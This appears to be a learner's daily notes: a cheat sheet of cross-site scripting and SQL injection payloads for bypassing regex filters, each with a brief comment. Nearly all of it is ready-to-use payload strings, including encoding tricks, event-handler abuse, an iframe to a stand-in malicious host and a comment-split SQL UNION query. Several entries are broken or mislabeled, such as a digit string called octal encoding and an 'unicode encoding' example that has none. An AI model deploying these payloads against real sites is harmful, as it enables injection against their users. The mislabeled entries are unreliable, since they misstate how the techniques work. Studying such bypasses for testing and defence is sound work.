Daily Notes : Day 78 
REGEX BYPASSES

<sCrIpT>alert(XSS)</sCriPt> 
#changing the case of the tag

<<script>alert(XSS)</script> 
#prepending an additional "<"

<script>alert(XSS) // 
#removing the closing tag

<script>alert`XSS`</script> 
#using backticks instead of parenetheses

java%0ascript:alert(1) 
#using encoded newline characters

<iframe src=http://malicous.com < 
#double open angle brackets

<STYLE>.classname{background-image:url("javascript:alert(XSS)");}</STYLE> 
#uncommon tags

<img/src=1/onerror=alert(0)> 
#bypass space filter by using / where a space is expected

<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=javascript:alert(1)>xss</a> 
#extra characters

Function("ale"+"rt(1)")(); 
#using uncommon functions besides alert, console.log, and prompt

javascript:74163166147401571561541571411447514115414516216450615176 
#octal encoding

<iframe src="javascript:alert(`xss`)"> 
#unicode encoding

/?id=1+un/**/ion+sel/**/ect+1,2,3-- 
#using comments in SQL query to break up statement

new Function`alt\`6\``; 
#using backticks instead of parentheses

data:text/html;base64,PHN2Zy9vbmxvYWQ9YWxlcnQoMik+ 
#base64 encoding the javascript

%26%2397;lert(1) 
#using HTML encoding

<a src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(XSS)"> 
#Using Line Feed (LF) line breaks 

<BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()> 
#use any chars that aren't letters, numbers, or encapsulation chars between event handler and equal sign (only works on Gecko engine)
